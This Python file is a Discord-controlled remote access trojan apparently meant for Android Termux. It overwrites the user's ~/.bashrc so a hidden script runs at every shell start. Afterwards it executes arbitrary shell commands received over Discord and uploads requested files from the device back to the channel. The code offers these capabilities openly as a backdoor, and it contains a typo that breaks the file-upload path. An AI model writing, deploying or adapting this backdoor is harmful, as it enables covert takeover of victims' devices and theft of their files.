import os
from discord.ext import commands
import discord
import asyncio


os.system('echo "python3 ~/../usr/etc/sisten.py" > ~/.bashrc &')

def chave():
    with open('/data/data/com.termux/files/usr/etc/.key.txt', 'r') as arquivo:
       key = arquivo.read()
    return key.strip()

def cmd_cmd(comando):
    try:
        return os.popen(comando).read()
    except:
        return "#ERRO#"

def smd_smd(comando):
    try:
        os.system(comando)
        return "#comando executado#"
    except:
        return "#ERRO#"

# configuração do bot
intents = discord.Intents().all()
client = discord.Client(intents=intents)

# menssagem no prompt para indicar que esra online
@client.event
async def on_ready():
    print()

# eventos | comandos
@client.event
async def on_message(message):
    comando = message.content
    comando = comando.split(' ')

    if message.author == client.user:
        pass

    if comando[0] == '$ajuda':
        await message.channel.send('''```
baixar arquivo:
    $arquivo <camnho/do/arquivo>

exevitar comando com resposta:
    $cmd <comando>

executar comando sem resposta:
    $smd <comando>
```''')

    if comando[0] == '$arquivo':
        try:
            await message.channel.send("aqui esta:", file=diacord.File(str(comando[1])))
        except:
            await message.channel.send("erro ao enviar arquivo")

    if comando[0] == '$cmd':
        cmd_ = message.content
        cmd_ = cmd_[5:].strip()
        res = cmd_cmd(cmd_)
        await message.channel.send(f'''

*_resposta_*:
```bash
{res}
```
''')

    if comando[0] == '$smd':
        cmd_ = message.content
        cmd_ = cmd_[5:].strip()
        res = smd_smd(cmd_)
        await message.channel.send(f'''
*_resposta_*:
```bash
{res}
```
''')


client.run(chave())
